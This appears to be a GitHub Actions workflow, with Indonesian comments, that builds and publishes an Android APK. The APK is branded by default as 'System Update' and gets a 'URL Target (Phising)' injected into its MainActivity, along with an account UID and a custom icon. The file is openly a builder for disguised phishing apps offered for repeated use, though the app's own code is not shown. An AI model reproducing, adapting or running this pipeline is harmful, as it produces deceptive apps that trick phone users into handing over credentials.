name: Build Sync XxX APK

on:
  workflow_dispatch:
    inputs:
      app_name:
        description: 'Nama Aplikasi'
        required: true
        default: 'System Update'
      target_url:
        description: 'URL Target (Phising)'
        required: true
        default: 'https://example.com'
      uid:
        description: 'UID Akun'
        required: true
        default: 'nexsus-xxxxxxx'
      icon_url:
        description: 'URL Icon (PNG/JPG)'
        required: false
        default: 'https://files.catbox.moe/0iq0n3.jpg'

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      actions: write

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install Pillow & Requests
        run: pip install Pillow requests

      # ─── INJECT CONFIG KE MANIFEST & MainActivity ───
      - name: Inject Config (Nama, URL, UID)
        run: |
          # 1. Update strings.xml (kalau dipakai di theme)
          sed -i 's|<string name="app_name">.*</string>|<string name="app_name">${{ github.event.inputs.app_name }}</string>|g' \
            android/app/src/main/res/values/strings.xml

          # 2. Update AndroidManifest.xml — ganti semua label & alias utama
          #    (supaya "Mario Song" / label lain hilang)
          sed -i "s|android:label=\"[^\"]*\"|android:label=\"${{ github.event.inputs.app_name }}\"|g" \
            android/app/src/main/AndroidManifest.xml

          # 3. Update TARGET_URL di MainActivity.kt
          sed -i 's|"TARGET_URL_PLACEHOLDER"|"${{ github.event.inputs.target_url }}"|g' \
            android/app/src/main/java/com/sync/xxx/MainActivity.kt

          # 4. Update UID asset
          mkdir -p android/app/src/main/assets/
          echo '{"uid":"${{ github.event.inputs.uid }}"}' > android/app/src/main/assets/uid.json

          # 5. Download icon
          curl -L -o custom_icon.png "${{ github.event.inputs.icon_url }}"

      - name: Generate App Icons
        run: python3 generate_icons.py custom_icon.png

      - name: Setup Gradle Wrapper
        run: |
          curl -L -o android/gradle/wrapper/gradle-wrapper.jar \
            "https://github.com/gradle/gradle/raw/v8.4.0/gradle/wrapper/gradle-wrapper.jar"
          chmod +x android/gradlew

      - name: Build Release APK
        run: |
          cd android
          ./gradlew assembleRelease --no-daemon

      - name: Rename APK
        run: |
          mkdir -p output
          find android/app/build/outputs/apk/release/ -name "*.apk" | head -1 \
            | xargs -I{} cp {} output/SyncXxX.apk

      - name: Create Release and Upload APK
        uses: softprops/action-gh-release@v1
        with:
          tag_name: build-${{ github.run_id }}
          name: "Build ${{ github.event.inputs.app_name }}"
          files: output/SyncXxX.apk
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}